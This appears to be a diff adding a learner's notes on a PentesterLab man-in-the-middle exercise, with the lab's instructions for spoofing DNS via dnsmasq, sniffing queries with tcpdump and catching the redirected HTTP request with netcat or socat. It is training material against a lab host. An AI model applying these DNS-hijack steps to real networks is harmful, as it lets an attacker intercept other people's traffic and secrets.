@@ -1,0 +1,177 @@
+*** for google cloud platform change firewall rules to include udp port 53 for all instances ***
+
+sudo apt-get install tcpdump
+sudo tcpdump
+
+we get a lot of traffic since we are displaying traffic (feedback loop)
+we need to filter our traffic
+
+sudo ifconfig
+sudo tcpdump -i eth0 udp port 53
+
+$ sudo tcpdump -i eth0 udp port 53
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
+13:22:09.210548 IP 163-172-214-251.rev.poneytelecom.eu.46120 > mitm-1.us-central1-a.c.total-byte-228618.internal.domain: 59823+ AAAA? mitm1.pentesterlab.com. (40)
+13:22:09.210805 IP 163-172-214-251.rev.poneytelecom.eu.57868 > mitm-1.us-central1-a.c.total-byte-228618.internal.domain: 24208+ A? mitm1.pentesterlab.com. (40)
+13:22:09.212035 IP mitm-1.us-central1-a.c.total-byte-228618.internal.60000 > metadata.google.internal.domain: 42873+ PTR? 251.214.172.163.in-addr.arpa. (46)
+13:22:09.213245 IP metadata.google.internal.domain > mitm-1.us-central1-a.c.total-byte-228618.internal.60000: 42873 1/0/0 PTR 163-172-214-251.rev.poneytelecom.eu. (95)
+13:22:14.208300 IP 163-172-214-251.rev.poneytelecom.eu.49050 > mitm-1.us-central1-a.c.total-byte-228618.internal.domain: 11266+ AAAA? mitm1.pentesterlab.com. (40)
+13:22:14.210946 IP 163-172-214-251.rev.poneytelecom.eu.38531 > mitm-1.us-central1-a.c.total-byte-228618.internal.domain: 11218+ A? mitm1.pentesterlab.com. (40)
+
+
+AAAA => IPv6
+A => IPv4
+
+the client is trying to access mitm1.pentesterlab.com.
+the attacker IP is 34.69.86.92
+
+dnsmasq will be used as our dns server
+dnsmasq.hosts => 34.69.86.92 mitm1.pentesterlab.com
+
+sudo dnsmasq -C dnsmasq.conf --no-daemon
+dnsmasq: failed to create listening socket for port 53: Address already in use
+# it's pretty common for linux flavours to start a service when you install it
+$ sudo service dnsmasq stop
+$ sudo apt install dnsutils
+
+dig @34.69.86.92 mitm.pentesterlab.com
+
+$ dig @34.69.86.92 mitm1.pentesterlab.com
+; <<>> DiG 9.10.3-P4-Debian <<>> @34.69.86.92 mitm1.pentesterlab.com
+; (1 server found)
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 14456
+;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4096
+;; QUESTION SECTION:
+;mitm1.pentesterlab.com.                IN      A
+;; ANSWER SECTION:
+mitm1.pentesterlab.com. 0       IN      A       34.69.86.92
+;; Query time: 1 msec
+;; SERVER: 34.69.86.92#53(34.69.86.92)
+;; WHEN: Thu Sep 26 13:43:14 UTC 2019
+;; MSG SIZE  rcvd: 67
+
+we can see in the answer section that mitm1 is resolving to our attacker ip (34.69.86.92)
+
+$ sudo apt install netcat
+$ sudo nc -l -p 80
+
+after sending another request from scoring page
+
+GET / HTTP/1.1
+Host: mitm1.pentesterlab.com
+PTL_KEY: 4905e0a2-ed2d-4031-a31a-1221c95e488f
+Connection: Close
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+mitm intro
+
+mimic the attack of:
+
+	mobile apps
+	thick clients
+	users on a wireless networks
+
+as an attacker you have control over dns resolution
+for tcp nothing will prevent this attack
+tls should prevent this attack
+
+1:tcp80
+2:tls w/o verification
+3:tls w/o hostname verification
+4:cve-2011-0228 iOS
+5:cve-2014-1266 goto fail;
+
+
+in this exercise, you have control over the client's dns resolution. using this you will be able to lie and tell the client to go to your server instead of the legitimate one. if you manage to get access to the request's content, you finished this exercise.
+
+this exercise is divided in two steps:
+
+    setting up a dns server.
+    setting up a tcp server.
+
+this is an introduction to more complex exercises that will go into details on how to intercept tls connection.
+to follow this exercise, you will need a public ip address with root access.
+
+setting up a dns server
+
+to setup a quick and easy dns server, you can use dnsmasq. it can easily be installed using apt, brew or yum depending on your system.
+once you have it installed, you can create a very simple configuration file (dnsmasq.conf):
+
+addn-hosts=dnsmasq.hosts
+
+this configuration will tell dnsmasq where to look for your resolution file (dnsmasq.hosts).
+the dnsmasq.hosts file has a syntax very similar to /etc/hosts:
+
+127.0.0.123   test1.pentesterlab.com
+
+once both files are created, you can start dnsmasq in the foreground using:
+
+$ sudo dnsmasq -C dnsmasq.conf --no-daemon
+
+if dnsmasq refuses to start it's probably because it may already be running. some linux flavors automatically start the daemon when you install it. make sure you stop the service before running this command. you can then test your configuration using dig or host:
+
+    with dig:
+
+% dig @localhost test1.pentesterlab.com
+
+; <<>> DiG 9.8.3-P1 <<>> @localhost test1.pentesterlab.com
+; (3 servers found)
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 15562
+;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0
+
+;; QUESTION SECTION:
+;test1.pentesterlab.com.    IN  A
+
+;; ANSWER SECTION:
+test1.pentesterlab.com. 0 IN  A 127.0.0.123
+
+;; Query time: 6 msec
+;; SERVER: ::1#53(::1)
+;; WHEN: Sun Jan  3 11:11:12 2016
+;; MSG SIZE  rcvd: 56
+
+    with host:
+
+% host test1.pentesterlab.com 127.0.0.1
+Using domain server:
+Name: 127.0.0.1
+Address: 127.0.0.1#53
+Aliases: 
+
+test1.pentesterlab.com has address 127.0.0.123
+
+to perform this attack you will obviously need to know what host the server is trying to access. to do so, you can use tcpdump:
+
+% sudo tcpdump -i [INT] udp port 53
+
+where:
+
+    [INT] is the interface you want to listen on. For example, eth0.
+    udp port 53 is used to only sniff UDP packets on port 53 (to keep DNS queries).
+
+after getting the application to use your server as DNS server, you should see a DNS query in tcpdump:
+
+% sudo tcpdump -i eth0 udp port 53
+tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
+05:30:44.362946 IP ptl-intercept-cd787546.libcurl.so.50148 > 104.131.54.221.domain: 43145+ AAAA? mitm1.pentesterlab.com. (40)
+05:30:44.363151 IP ptl-intercept-cd787546.libcurl.so.51919 > 104.131.54.221.domain: 39139+ A? mitm1.pentesterlab.com. (40)
+05:30:44.363716 IP ptl-intercept-cd787546.libcurl.so.43344 > 104.131.54.221.domain: 30919+ A? mitm1.pentesterlab.com. (40)
+
+based on this information, you can update your dnsmasq.hosts file.
+a simple TCP server
+
+know that we got the client to connect to us, we just need to setup a TCP server. this can easily be done using:
+
+    netcat with sudo nc -l -p 80
+    or socat:
+
+$ socat TCP4-LISTEN:80,fork,reuseaddr -
